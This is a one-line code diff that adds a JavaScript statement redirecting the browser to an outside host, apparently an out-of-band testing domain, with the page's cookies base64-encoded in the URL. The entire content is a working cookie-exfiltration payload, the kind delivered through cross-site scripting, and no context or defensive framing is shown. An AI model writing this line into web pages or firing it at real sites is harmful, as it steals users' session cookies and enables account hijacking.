@@ -1,0 +1,1 @@
+document.location = "https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/a?c=" + btoa(document.cookie);
